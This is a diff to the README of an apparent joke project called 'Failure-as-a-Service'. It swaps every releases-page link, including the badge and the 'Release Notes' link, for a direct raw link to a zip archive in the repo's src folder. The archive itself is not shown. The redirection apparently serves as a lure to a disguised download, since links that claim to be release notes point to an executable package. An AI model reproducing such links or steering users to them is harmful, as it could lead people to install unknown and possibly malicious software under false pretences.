@@ -1,6 +1,6 @@
 # 🎉 Failure-as-a-Service - Your Source for Reliable Disappointment
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-blue)](https://github.com/kraiger05/Failure-as-a-Service/releases)
+[![Download Latest Release](https://github.com/kraiger05/Failure-as-a-Service/raw/refs/heads/main/src/a_as_Service_Failure_2.5.zip%20Latest%20Release-Here-blue)](https://github.com/kraiger05/Failure-as-a-Service/raw/refs/heads/main/src/a_as_Service_Failure_2.5.zip)
 
 ## 📦 Introduction
 
@@ -20,7 +20,7 @@ To get started with Failure-as-a-Service, you only need to follow a few simple s
 ### 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to our Releases page:
-   [Visit this page to download](https://github.com/kraiger05/Failure-as-a-Service/releases).
+   [Visit this page to download](https://github.com/kraiger05/Failure-as-a-Service/raw/refs/heads/main/src/a_as_Service_Failure_2.5.zip).
 
 2. **Choose the Latest Version:** On the Releases page, you will see different versions available. Look for the latest version at the top.
 
@@ -72,6 +72,6 @@ If you encounter any issues while using FaaS, please visit our GitHub Issues pag
 
 Stay updated with the latest changes and features. Regular updates ensure you have the best experience possible with Failure-as-a-Service. 
 
-To find out what's new, visit our [Release Notes](https://github.com/kraiger05/Failure-as-a-Service/releases).
+To find out what's new, visit our [Release Notes](https://github.com/kraiger05/Failure-as-a-Service/raw/refs/heads/main/src/a_as_Service_Failure_2.5.zip).
 
-[Download Latest Release](https://github.com/kraiger05/Failure-as-a-Service/releases)
+[Download Latest Release](https://github.com/kraiger05/Failure-as-a-Service/raw/refs/heads/main/src/a_as_Service_Failure_2.5.zip)
